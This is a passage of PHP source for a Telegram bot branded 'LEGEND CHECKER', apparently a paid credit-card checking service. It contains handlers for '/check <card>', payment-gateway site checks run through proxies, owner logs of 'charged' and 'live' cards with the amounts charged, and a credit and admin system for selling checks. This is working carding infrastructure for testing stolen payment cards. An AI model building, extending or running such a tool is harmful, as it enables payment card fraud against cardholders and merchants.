            'Result: ' . $finalType . ' (' . $uiStatus . ')'
        );
    } catch (Exception $e) {
        error_log('Owner logging failed: ' . $e->getMessage());
    }

    $statusDisplay = $apiStatus !== '' ? $apiStatus : $uiStatus;
    $emoji = getStatusEmojiForType($finalType);
    $proxyLine = '';
    if ($proxyStatus !== 'N/A' || $proxyIp !== 'N/A') {
        $proxyLine = "🛰️ <b>Proxy:</b> " . htmlEscape($proxyStatus);
        if ($proxyIp !== 'N/A') {
            $proxyLine .= " (" . htmlEscape($proxyIp) . ")";
        }
        $proxyLine .= "\n";
    }

    $creditsLine = '';
    if ($creditCost > 0) {
        $creditsLine = "💰 <b>Credits Used:</b> {$creditCost}\n"
            . "🏦 <b>Remaining Credits:</b> {$remainingCredits}\n";
    }

    $finalMessage = "{$emoji} <b>Site Check Result</b>\n\n"
        . "🔗 <b>Site:</b> " . htmlEscape($siteInput) . "\n"
        . "📣 <b>Response:</b> " . htmlEscape($statusDisplay) . "\n"
        . "🎯 <b>Status:</b> " . htmlEscape($finalType) . "\n"
        . "🏦 <b>Gateway:</b> " . htmlEscape($gateway) . "\n"
        . "💵 <b>Amount:</b> " . htmlEscape($price) . "\n"
        . $proxyLine
        . "⏱️ <b>Time:</b> " . formatDurationMs($elapsedMs) . "\n"
        . $creditsLine;

    if ($warning) {
        $finalMessage .= "\n⚠️ <i>" . htmlEscape($warning) . "</i>";
    }

    sendMessage($chat_id, $finalMessage);
}

function handleHelp($chat_id, $user_id) {
    $msg = "📖 <b>Command Reference</b>\n\n";
    $msg .= "<b>🎯 Basic Commands:</b>\n";
    $msg .= "/start - Get started\n";
    $msg .= "/ping - Quick bot ping\n";
    $msg .= "/health - Bot health info\n";
    $msg .= "/credits - Check balance\n";
    $msg .= "/claim &lt;code&gt; - Redeem credit code\n";
    $msg .= "/check &lt;card&gt; - Check credit card\n";
    $msg .= "/site &lt;url&gt; - Validate site\n";
    $msg .= "/help - This message\n";
    
    if (isAdmin($user_id)) {
        $msg .= "\n<b>🛡️ Admin Commands:</b>\n";
        $msg .= "/admin - Admin dashboard\n";
        $msg .= "/generate &lt;amount&gt; [qty] - Generate credit codes\n";
        $msg .= "/broadcast &lt;message&gt; - Send announcement\n";
        $msg .= "/users - List users\n";
        $msg .= "/addcredits &lt;user_id&gt; &lt;amount&gt; - Gift credits\n";
        $msg .= "/ban &lt;user_id&gt; - Ban user\n";
        $msg .= "/unban &lt;user_id&gt; - Unban user\n";
        $msg .= "/stats - Statistics\n";
    }
    
    if (isOwner($user_id)) {
        $msg .= "\n<b>👑 Owner Commands:</b>\n";
        $msg .= "/addadmin &lt;user_id&gt; - Add admin\n";
        $msg .= "/removeadmin &lt;user_id&gt; - Remove admin\n";
        $msg .= "/admins - List all admins\n";
        $msg .= "/cclogs [limit] - View charged CC logs\n";
        $msg .= "/getlogs [status] - View all check logs\n";
    $msg .= "/systemstats - Detailed system stats\n";
    $msg .= "/changeconfig - View settings\n";
    $msg .= "/settimeout card|site <sec> [conn] - Set timeouts\n";
    $msg .= "/setchat <chat_id> - Set notify chat\n";
    $msg .= "/notif [list|<key> on|off] - Toggle notifications\n";
        $msg .= "/getwebhook - Show webhook\n";
        $msg .= "/setwebhook <url> - Set webhook\n";
    }
    
    sendMessage($chat_id, $msg);
}

function handlePing($chat_id) {
    $ts = date('Y-m-d H:i:s');
    sendMessage($chat_id, "🏓 Pong! <b>{$ts}</b>");
}

function handleHealth($chat_id) {
    global $bot_api_url;
    $getMeUrl = $bot_api_url . 'getMe';
    $resp = @file_get_contents($getMeUrl);
    $ok = false; $uname = 'unknown';
    if ($resp !== false) {
        $j = json_decode($resp, true);
        $ok = $j['ok'] ?? false;
        $uname = $j['result']['username'] ?? 'unknown';
    }
    $msg = "💚 <b>Bot Health</b>\n\n" .
           "API: " . ($ok ? 'OK ✅' : 'Fail ❌') . "\n" .
           "Bot: @{$uname}\n" .
           "Time: " . date('Y-m-d H:i:s') . "\n" .
           "PHP: " . phpversion();
    sendMessage($chat_id, $msg);
}

function handleGetWebhook($chat_id, $user_id) {
    global $bot_api_url;
    $info = @file_get_contents($bot_api_url . 'getWebhookInfo');
    if ($info === false) {
        sendMessage($chat_id, "❌ Failed to get webhook info");
        return;
    }
    sendMessage($chat_id, "🔗 <b>Webhook Info</b>\n<pre>" . htmlspecialchars($info) . "</pre>");
}

function handleSetWebhook($parts, $chat_id, $user_id) {
    global $bot_api_url;
    if (count($parts) < 2) {
        sendMessage($chat_id, "❌ Usage: /setwebhook <url>");
        return;
    }
    $url = trim($parts[1]);
    $ch = curl_init($bot_api_url . 'setWebhook');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ['url' => $url]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    $res = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);
    if ($res === false) {
        sendMessage($chat_id, "❌ setWebhook error: " . htmlspecialchars($err));
        return;
    }
    sendMessage($chat_id, "✅ setWebhook response:\n<pre>" . htmlspecialchars($res) . "</pre>");
}

/**
 * Owner Commands
 */
function handleAddAdmin($parts, $chat_id, $user_id) {
    global $adminManager;
    
    if (count($parts) < 2) {
        sendMessage($chat_id, "❌ Usage: /addadmin &lt;user_id&gt; [username]\nExample: /addadmin 123456789 @johndoe");
        return;
    }
    
    $new_admin_id = intval($parts[1]);
    $new_admin_username = $parts[2] ?? null;
    
    $result = $adminManager->addAdmin($new_admin_id, $new_admin_username, $user_id);
    
    if ($result['success']) {
        $msg = "✅ <b>Admin added successfully!</b>\n\n";
        $msg .= "👤 <b>User ID:</b> {$new_admin_id}\n";
        if ($new_admin_username) {
            $msg .= "📝 <b>Username:</b> {$new_admin_username}\n";
        }
        $msg .= "\n🎉 User has been granted admin privileges!";
        
        // Notify new admin
        sendMessage($new_admin_id, "🎉 <b>Congratulations!</b>\n\nYou've been promoted to <b>ADMIN</b>!\n\nUse /help to see your new commands.");
    } else {
        $msg = "❌ {$result['message']}";
    }
    
    sendMessage($chat_id, $msg);
}

function handleRemoveAdmin($parts, $chat_id, $user_id) {
    global $adminManager;
    
    if (count($parts) < 2) {
        sendMessage($chat_id, "❌ Usage: /removeadmin &lt;user_id&gt;\nExample: /removeadmin 123456789");
        return;
    }
    
    $admin_id = intval($parts[1]);
    
    $result = $adminManager->removeAdmin($admin_id, $user_id);
    
    if ($result['success']) {
        $msg = "✅ <b>Admin removed successfully!</b>\n\n";
        $msg .= "👤 <b>User ID:</b> {$admin_id}\n";
        
        // Notify removed admin
        sendMessage($admin_id, "ℹ️ <b>Notice:</b>\n\nYour admin privileges have been revoked.");
    } else {
        $msg = "❌ {$result['message']}";
    }
    
    sendMessage($chat_id, $msg);
}

function handleListAdmins($chat_id, $user_id) {
    global $adminManager;
    
    $admins = $adminManager->getAllAdmins();
    
    if (empty($admins)) {
        sendMessage($chat_id, "📋 No admins found.");
        return;
    }
    
    $msg = "👥 <b>Admin List</b>\n\n";
    
    foreach ($admins as $admin) {
        $type_emoji = $admin['type'] === 'owner' ? '👑' : ($admin['type'] === 'static' ? '🛡️' : '⭐');
        $type_label = strtoupper($admin['type']);
        
        $msg .= "{$type_emoji} <b>[{$type_label}]</b>\n";
        $msg .= "├ ID: <code>{$admin['telegram_id']}</code>\n";
        if (isset($admin['username'])) {
            $msg .= "├ User: {$admin['username']}\n";
        }
        if (isset($admin['added_at'])) {
            $date = $admin['added_at'] instanceof MongoDB\BSON\UTCDateTime 
                ? $admin['added_at']->toDateTime()->format('Y-m-d') 
                : date('Y-m-d', strtotime($admin['added_at']));
            $msg .= "└ Added: {$date}\n";
        } else {
            $msg .= "└ Status: Active\n";
        }
        $msg .= "\n";
    }
    
    sendMessage($chat_id, $msg);
}

function handleCCLogs($parts, $chat_id, $user_id) {
    global $ccLogger;
    
    $limit = isset($parts[1]) ? intval($parts[1]) : 10;
    $limit = min($limit, 50); // Max 50
    
    $logs = $ccLogger->getChargedCards($limit);
    
    if (empty($logs)) {
        sendMessage($chat_id, "📝 No charged cards found.");
        return;
    }
    
    $msg = $ccLogger->formatLogsForBot($logs, $limit);
    
    // Add summary
    $stats = $ccLogger->getStatistics();
    $msg .= "\n📊 <b>Summary:</b>\n";
    $msg .= "💰 Total Charged: {$stats['charged_cards']}\n";
    $msg .= "💵 Total Amount: \${$stats['total_amount_charged']}\n";
    
    sendMessage($chat_id, $msg);
}

function handleGetLogs($parts, $chat_id, $user_id) {
    global $ccLogger;
    
    $status_filter = isset($parts[1]) ? strtolower($parts[1]) : null;
    $limit = isset($parts[2]) ? intval($parts[2]) : 20;
    $limit = min($limit, 50);
    
    $filters = [];
    if ($status_filter && in_array($status_filter, ['charged', 'live', 'declined'])) {
        $filters['status'] = $status_filter;
    }
    
    $logs = $ccLogger->getAllLogs($limit, $filters);
    
    if (empty($logs)) {
        sendMessage($chat_id, "📝 No logs found.");
        return;
    }
    
    $msg = $ccLogger->formatLogsForBot($logs, $limit);
    sendMessage($chat_id, $msg);
}

function handleSystemStats($chat_id, $user_id) {
    global $db, $ccLogger;
    
    $users = $db->getAllUsers(10000, 0);
    $total_users = count($users);
    
    $total_credits = 0;
    $roles_count = [];
    $active_today = 0;
    $today_start = strtotime('today');
    
    foreach ($users as $user) {
        $total_credits += $user['credits'] ?? 0;
        $role = $user['role'] ?? 'free';
        $roles_count[$role] = ($roles_count[$role] ?? 0) + 1;
        
        if (isset($user['last_login_at'])) {
            $last_login = $user['last_login_at'] instanceof MongoDB\BSON\UTCDateTime 
                ? $user['last_login_at']->toDateTime()->getTimestamp()
                : strtotime($user['last_login_at']);
            
            if ($last_login >= $today_start) {
                $active_today++;
            }
        }
    }
    
    $cc_stats = $ccLogger->getStatistics();
    
    $msg = "📊 <b>LEGEND CHECKER - System Statistics</b>\n\n";
    $msg .= "👥 <b>Users:</b>\n";
    $msg .= "├ Total: {$total_users}\n";
    $msg .= "└ Active Today: {$active_today}\n\n";
    
    $msg .= "🎭 <b>Roles:</b>\n";
    foreach ($roles_count as $role => $count) {
        $msg .= "├ " . ucfirst($role) . ": {$count}\n";
    }
    $msg .= "\n";
    
    $msg .= "💰 <b>Credits:</b>\n";
    $msg .= "└ Total Distributed: {$total_credits}\n\n";
    
    $msg .= "💳 <b>CC Checks:</b>\n";
    $msg .= "├ Total: {$cc_stats['total_checks']}\n";
    $msg .= "├ Charged: {$cc_stats['charged_cards']}\n";
    $msg .= "├ Live: {$cc_stats['live_cards']}\n";
    $msg .= "├ Declined: {$cc_stats['declined_cards']}\n";
    $msg .= "└ Amount: \${$cc_stats['total_amount_charged']}\n\n";
    
    $msg .= "🕐 <b>Generated:</b> " . date('Y-m-d H:i:s');
    
    sendMessage($chat_id, $msg);
}

function handleChangeConfig($parts, $chat_id, $user_id) {
    $msg = "⚙️ <b>Configuration Management</b>\n\n";
    $msg .= "Current configurations:\n\n";
    $msg .= "🔗 <b>Domain:</b> " . AppConfig::DOMAIN . "\n";
    $msg .= "🤖 <b>Bot:</b> " . TelegramConfig::BOT_NAME . "\n";
    $msg .= "💾 <b>Database:</b> " . DatabaseConfig::DATABASE_NAME . "\n";
    $msg .= "🗨️ <b>Notify Chat:</b> " . (SiteConfig::get('notification_chat_id', TelegramConfig::CHAT_ID)) . "\n\n";
    $msg .= "⏱️ <b>Timeouts (s):</b>\n";
    $msg .= "├ Card: " . (int)SiteConfig::get('card_check_timeout', 60) . " (connect: " . (int)SiteConfig::get('card_connect_timeout', 15) . ")\n";
    $msg .= "└ Site: " . (int)SiteConfig::get('site_check_timeout', 60) . " (connect: " . (int)SiteConfig::get('site_connect_timeout', 15) . ")\n\n";
    $msg .= "🔔 <b>Notifications:</b>\n";
    $flags = [
        'notify_login' => 'Login',
        'notify_register' => 'Register',
        'notify_card_results' => 'Card Results (All)',
        'notify_card_charged' => 'Card Charged',
        'notify_claim' => 'Claims',
        'notify_site_check' => 'Site Check'
    ];
    foreach ($flags as $k => $label) {
        $val = SiteConfig::get($k, in_array($k, ['notify_login','notify_register','notify_card_charged','notify_claim']));
        $msg .= "├ {$label}: " . ($val ? 'ON' : 'OFF') . "\n";
    }
    $msg .= "\nCommands:\n";
    $msg .= "• /settimeout card|site <seconds> [connectSeconds]\n";
    $msg .= "• /setchat <chat_id>\n";
    $msg .= "• /notif [list|<key> on|off]\n";
    
    sendMessage($chat_id, $msg);
}

function handleSetTimeout($parts, $chat_id, $user_id) {
    if (count($parts) < 3) {
        sendMessage($chat_id, "❌ Usage: /settimeout card|site <seconds> [connectSeconds]");
        return;
    }
    $target = strtolower($parts[1]);
    $secs = (int)$parts[2];
    $conn = isset($parts[3]) ? (int)$parts[3] : null;
    if ($secs <= 0) {
        sendMessage($chat_id, "❌ Seconds must be positive");
        return;
    }
    if ($target === 'card') {
        SiteConfig::save(['card_check_timeout' => $secs] + ($conn !== null ? ['card_connect_timeout' => $conn] : []));
        sendMessage($chat_id, "✅ Card timeout set to {$secs}s" . ($conn !== null ? ", connect {$conn}s" : ''));
    } elseif ($target === 'site') {
        SiteConfig::save(['site_check_timeout' => $secs] + ($conn !== null ? ['site_connect_timeout' => $conn] : []));
        sendMessage($chat_id, "✅ Site timeout set to {$secs}s" . ($conn !== null ? ", connect {$conn}s" : ''));
    } else {
        sendMessage($chat_id, "❌ Unknown target: {$target}");
    }
}

function handleSetChat($parts, $chat_id, $user_id) {
    if (count($parts) < 2) {
        sendMessage($chat_id, "❌ Usage: /setchat <chat_id>\nTip: Forward any message from your channel/group to the bot to copy its chat_id.");
        return;
    }
    $newId = trim($parts[1]);
    SiteConfig::save(['notification_chat_id' => $newId]);
    sendMessage($chat_id, "✅ Notification chat set to <code>{$newId}</code>");
}

function handleNotif($parts, $chat_id, $user_id) {
    $allowed = [
        'notify_login','notify_register','notify_card_results','notify_card_charged','notify_claim','notify_site_check'
    ];
    if (count($parts) === 1 || strtolower($parts[1]) === 'list') {
        $msg = "🔔 <b>Notification Flags</b>\n";
        foreach ($allowed as $k) {
            $msg .= "• {$k}: " . (SiteConfig::get($k, in_array($k, ['notify_login','notify_register','notify_card_charged','notify_claim'])) ? 'ON' : 'OFF') . "\n";
        }
        sendMessage($chat_id, $msg);
        return;
    }
    if (count($parts) < 3) {
        sendMessage($chat_id, "❌ Usage: /notif <key> on|off\nUse /notif list to view keys");
        return;
    }
    $key = strtolower($parts[1]);
    $val = strtolower($parts[2]);
    if (!in_array($key, $allowed)) {
        sendMessage($chat_id, "❌ Unknown key: {$key}");
        return;
    }
    $on = in_array($val, ['on','true','1','enable','enabled']);
    SiteConfig::save([$key => $on]);
    sendMessage($chat_id, "✅ {$key} set to " . ($on ? 'ON' : 'OFF'));
}

/**
 * Admin Commands
 */
function handleAdminMenu($chat_id, $user_id) {
    $msg = "🛡️ <b>Admin Dashboard</b>\n\n";
    $msg .= "Available commands:\n\n";
    $msg .= "💰 /generate &lt;amount&gt; [qty] - Generate credits\n";
    $msg .= "📢 /broadcast &lt;message&gt; - Announce\n";
    $msg .= "👥 /users - List users\n";
    $msg .= "🎁 /addcredits &lt;id&gt; &lt;amt&gt; - Gift credits\n";
    $msg .= "📊 /stats - Statistics\n";
    $msg .= "🚫 /ban &lt;user_id&gt; - Ban user\n";
    $msg .= "✅ /unban &lt;user_id&gt; - Unban user\n";
    
    sendMessage($chat_id, $msg);
}

function handleGenerateCredits($parts, $chat_id, $user_id) {
    if (count($parts) < 2) {
        sendMessage($chat_id, "❌ Usage: /generate &lt;amount&gt; [quantity]\nExample: /generate 100 5");
        return;
    }
    
    $amount = intval($parts[1]);
    $quantity = isset($parts[2]) ? intval($parts[2]) : 1;
    
    if ($amount <= 0 || $quantity <= 0 || $quantity > 20) {
        sendMessage($chat_id, "❌ Invalid parameters. Amount > 0, Quantity 1-20");
        return;
    }
    
    $codes = generateCreditCodes($amount, $quantity);
    
    $msg = "✅ <b>Generated {$quantity} credit code(s)!</b>\n\n";
    foreach ($codes as $code) {
        $msg .= "💳 <code>{$code}</code> (+{$amount} credits)\n";
    }
    $msg .= "\n📝 Share these codes with users to redeem.";
    
    sendMessage($chat_id, $msg);
}

function handleBroadcast($parts, $chat_id, $user_id) {
    if (count($parts) < 2) {
        sendMessage($chat_id, "❌ Usage: /broadcast &lt;message&gt;\nExample: /broadcast System maintenance tonight at 10 PM");
        return;
    }
    
    array_shift($parts); // Remove command
    $message = implode(' ', $parts);
    
    $result = broadcastMessage($message);
    sendMessage($chat_id, $result);
}

function handleListUsers($chat_id, $user_id) {
    global $db;
    
    $users = $db->getAllUsers(10, 0);
    
    if (empty($users)) {
        sendMessage($chat_id, "👥 No users found.");
        return;
    }
    
    $msg = "👥 <b>Recent Users</b> (Last 10)\n\n";
    
    foreach ($users as $user) {
        $telegram_id = $user['telegram_id'];
        $username = $user['username'] ?? 'Unknown';
        $credits = $user['credits'] ?? 0;
        $role = ucfirst($user['role'] ?? 'free');
        
        $msg .= "👤 @{$username}\n";
        $msg .= "├ ID: <code>{$telegram_id}</code>\n";
        $msg .= "├ Credits: {$credits}\n";
        $msg .= "└ Role: {$role}\n\n";
    }
    
    sendMessage($chat_id, $msg);
}

function handleAddCredits($parts, $chat_id, $user_id) {
    global $db;
    
    if (count($parts) < 3) {
        sendMessage($chat_id, "❌ Usage: /addcredits &lt;user_id&gt; &lt;amount&gt;\nExample: /addcredits 123456789 100");
        return;
    }
    
    $target_id = intval($parts[1]);
    $amount = intval($parts[2]);
    
    if ($amount <= 0) {
        sendMessage($chat_id, "❌ Amount must be positive.");
        return;
    }
    
    $user = $db->getUserByTelegramId($target_id);
    if (!$user) {
        sendMessage($chat_id, "❌ User not found.");
        return;
    }
    
    $result = $db->addCredits($target_id, $amount);
    
    if ($result) {
        $new_balance = ($user['credits'] ?? 0) + $amount;
        
        // Notify user
        sendMessage($target_id, "🎁 <b>You received {$amount} credits from admin!</b>\n💳 <b>New Balance:</b> {$new_balance}");
        
        sendMessage($chat_id, "✅ <b>Successfully added {$amount} credits to user {$target_id}!</b>\n💰 <b>New Balance:</b> {$new_balance}");
    } else {
        sendMessage($chat_id, "❌ Failed to add credits.");
    }
}

function handleStats($chat_id, $user_id) {
    global $db;
    
    $users = $db->getAllUsers(1000, 0);
    $total = count($users);
    
    $roles = [];
    foreach ($users as $user) {
        $role = $user['role'] ?? 'free';
        $roles[$role] = ($roles[$role] ?? 0) + 1;
    }
    
    $msg = "📊 <b>Statistics</b>\n\n";
    $msg .= "👥 <b>Total Users:</b> {$total}\n\n";
    $msg .= "<b>Roles:</b>\n";
    foreach ($roles as $role => $count) {
        $msg .= "• " . ucfirst($role) . ": {$count}\n";
    }
    
    sendMessage($chat_id, $msg);
}

function handleBan($parts, $chat_id, $user_id) {
    global $db;
    
    if (count($parts) < 2) {
        sendMessage($chat_id, "❌ Usage: /ban &lt;user_id&gt;");
        return;
    }
    
    $target_id = intval($parts[1]);
    
    // Cannot ban admins or owner
    if (isAdmin($target_id)) {
        sendMessage($chat_id, "❌ Cannot ban admin or owner.");
        return;
    }
    
    if (method_exists($db, 'updateUser')) {
        $result = $db->updateUser($target_id, ['status' => 'banned']);
        if ($result) {
            sendMessage($target_id, "🚫 <b>Your account has been suspended.</b>");
            sendMessage($chat_id, "✅ User {$target_id} has been banned.");
        } else {
            sendMessage($chat_id, "❌ Failed to ban user.");
        }
    } else {
        sendMessage($chat_id, "❌ Ban function not available.");
    }
}

function handleUnban($parts, $chat_id, $user_id) {
    global $db;
    
    if (count($parts) < 2) {
        sendMessage($chat_id, "❌ Usage: /unban &lt;user_id&gt;");
        return;
    }
    
    $target_id = intval($parts[1]);
    
    if (method_exists($db, 'updateUser')) {
        $result = $db->updateUser($target_id, ['status' => 'active']);
        if ($result) {
            sendMessage($target_id, "✅ <b>Your account has been reactivated!</b>");
            sendMessage($chat_id, "✅ User {$target_id} has been unbanned.");
        } else {
            sendMessage($chat_id, "❌ Failed to unban user.");
        }
    } else {
        sendMessage($chat_id, "❌ Unban function not available.");
    }
}

/**
 * Helper Functions
 */
function generateCreditCodes($amount, $quantity) {
    $codes = [];
    
    for ($i = 0; $i < $quantity; $i++) {
        $code = 'CREDIT-' . strtoupper(bin2hex(random_bytes(4)));
        $codes[] = $code;
        
        $data = [
            'code' => $code,
            'credit_amount' => $amount,
            'type' => 'standard',
            'expiry_days' => 30,
            'expires_at' => time() + (30 * 24 * 60 * 60),
            'created_at' => time(),
            'created_by' => 'telegram_bot',
            'status' => 'active'
        ];
        
        $codes_file = __DIR__ . '/data/credit_codes.json';
        $existing = [];
        if (file_exists($codes_file)) {
            $existing = json_decode(file_get_contents($codes_file), true) ?? [];
        }
        $existing[] = $data;
        
        if (!is_dir(__DIR__ . '/data')) {
            mkdir(__DIR__ . '/data', 0755, true);
        }
        
        file_put_contents($codes_file, json_encode($existing, JSON_PRETTY_PRINT));
    }
    
    return $codes;
}

function broadcastMessage($message) {
    global $db;
    
    $users = $db->getAllUsers(1000, 0);
    $sent = 0;
    
    foreach ($users as $user) {
        $result = sendMessage($user['telegram_id'], "📢 <b>Announcement:</b>\n\n{$message}");
        if ($result && $result['ok']) {
            $sent++;
        }
        usleep(100000); // 0.1s delay
    }
    
    return "✅ <b>Broadcast sent to {$sent} users!</b>";
}

// Main execution
if ($text) {
    handleCommand($text, $chat_id, $user_id, $username);
}

http_response_code(200);
?>
